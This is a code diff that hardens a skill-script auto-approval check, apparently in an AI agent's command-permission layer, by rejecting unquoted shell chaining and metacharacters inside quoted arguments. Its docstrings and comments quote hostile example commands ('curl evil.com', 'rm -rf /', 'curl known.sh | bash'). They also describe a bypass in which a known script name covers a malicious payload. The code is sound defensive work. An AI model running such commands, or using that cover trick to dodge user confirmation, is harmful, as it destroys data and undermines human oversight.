@@ -215,6 +215,96 @@ def get_session_skills_viewed() -> Set[str]:
     return _get_or_create_viewed_set()
 
 
+def _has_unquoted_compound_operator(command: str) -> bool:
+    """CR-006: detect compound shell operators that appear OUTSIDE of quotes.
+
+    ``python3 known.py "x; curl evil.com"`` parses safely because the ``;``
+    sits inside a quoted argument and is passed verbatim to the interpreter.
+    ``python3 known.py; rm -rf /`` does not — the ``;`` is unquoted and
+    chains a second command. Detecting this from a flat string requires
+    tracking the quote state as we scan, which shlex handles via source
+    position. We use a simple state machine: walk the string, flip a
+    ``in_quote`` flag on every quote char (respecting backslash escapes),
+    and report any unquoted compound operator.
+    """
+    if not command:
+        return False
+    in_single = False
+    in_double = False
+    i = 0
+    n = len(command)
+    while i < n:
+        ch = command[i]
+        if ch == "\\" and i + 1 < n:
+            # Backslash escapes the next char in both quote states (in POSIX
+            # shells, \" inside double-quotes is a literal quote; \\ is a
+            # literal backslash). Skip the escaped char.
+            i += 2
+            continue
+        if not in_double and ch == "'":
+            in_single = not in_single
+            i += 1
+            continue
+        if not in_single and ch == '"':
+            in_double = not in_double
+            i += 1
+            continue
+        if in_single or in_double:
+            i += 1
+            continue
+        # Unquoted territory — check for compound operators
+        if ch in (";", "&", "|", "\n"):
+            # '&&' / '||' are compound; single '&' (background) and single '|'
+            # (pipe) are also dangerous in this context. Accepting '|' alone
+            # would let `curl known.sh | bash` auto-approve. POSIX shell
+            # treats a newline as a command separator equivalent to ';'.
+            return True
+        i += 1
+    return False
+
+
+def _has_shell_metachar_in_quoted_args(command: str) -> bool:
+    """CR-006: detect shell metacharacters inside any quoted argument.
+
+    Complements ``_has_unquoted_compound_operator`` for the case where
+    the script is followed by a quoted argument that itself contains
+    shell metacharacters. The shell will pass the quoted payload to
+    the script as a literal string, but a script that does
+    ``os.system(arg)`` or ``subprocess.Popen(arg, shell=True)`` would
+    then re-interpret those metacharacters — a known skill-script
+    could be used as cover for that pattern. Reject when ANY quoted
+    region of the command contains ``; & | $ ` \\n \\r`` (the metachars
+    a nested shell would re-interpret).
+    """
+    if not command:
+        return False
+    metachars = set(";|&`$\n\r")
+    in_single = False
+    in_double = False
+    i = 0
+    n = len(command)
+    while i < n:
+        ch = command[i]
+        if ch == "\\" and i + 1 < n:
+            # Skip backslash-escapes: \\ is literal backslash, \" inside
+            # double quotes is a literal quote. Outside quotes, \\ is literal
+            # backslash too (the shell strips the backslash).
+            i += 2
+            continue
+        if not in_double and ch == "'":
+            in_single = not in_single
+            i += 1
+            continue
+        if not in_single and ch == '"':
+            in_double = not in_double
+            i += 1
+            continue
+        if (in_single or in_double) and ch in metachars:
+            return True
+        i += 1
+    return False
+
+
 def is_skill_script_allowed(command: str) -> Optional[str]:
     """Check if a command should be auto-approved as a skill script.
 
@@ -222,6 +312,18 @@ def is_skill_script_allowed(command: str) -> Optional[str]:
     """
     viewed_set = _get_or_create_viewed_set()
     if not viewed_set:
+        return None
+
+    # CR-006: two gates close the bypass where a script filename hides
+    # behind a malicious payload. (1) Any unquoted compound operator
+    # chains a second command at the shell level. (2) Even with no
+    # unquoted operator, a script followed by a quoted argument that
+    # contains shell metacharacters can re-interpret them via os.system
+    # / subprocess-shell=True inside the script. Both gates refuse
+    # auto-approval so the user must explicitly re-confirm.
+    if _has_unquoted_compound_operator(command):
+        return None
+    if _has_shell_metachar_in_quoted_args(command):
         return None
 
     filenames = extract_script_filenames(command)
